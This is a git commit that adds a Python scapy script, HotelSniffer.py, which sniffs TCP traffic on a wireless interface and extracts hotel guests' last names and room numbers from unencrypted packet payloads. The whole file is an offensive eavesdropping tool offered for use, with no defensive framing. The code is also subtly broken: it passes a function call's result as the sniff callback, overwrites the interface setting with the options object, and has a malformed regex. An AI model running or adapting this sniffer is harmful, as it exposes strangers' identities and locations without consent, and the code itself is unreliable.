5108c348d5f170d8551f933a5f7196a37feed889
k0rup710n <61102077+k0rup710n@users.noreply.github.com>
2020-12-17 20:58:26 -0500

    Create HotelSniffer.py

---
+++ HotelSniffer.py
@@ -0,0 +1,27 @@
+from scapy.all import *
+import optparse
+import re
+conf.iface = "wlan0"
+def findGuest(pkt):
+    raw = pkt.sprintf("%Raw.load%")
+    name = re.findall("(?i)LAST_NAME=(.*)&'",raw)
+    room = re.findall("(?i)ROOM_NUMBER=(.*)'", raw)
+    if name:
+        print("[+] Found Hotel Guest" + str(name[0] + ", Room #" + str(room[0])))
+
+def getOptions():
+    parser = optparse.OptionParser()
+    parser.add_option("-i", "--interface", dest="interface", type="string", help="The name of the interface for sniffing.")
+    (options, args) = parser.parse_args()
+    if options.interface == None:
+        parser.error("Please specify an interface using the -i or --interface parameter.\nUse --help for more informations.")
+        exit(0)
+    else:
+        return options
+
+try:
+    conf.iface = getOptions()
+    print("[*] Starting Hotel Guest Sniffer.")
+    sniff(filter="tcp", prn=findGuest(conf.iface), store=0)
+except KeyboardInterrupt:
+    exit(0)
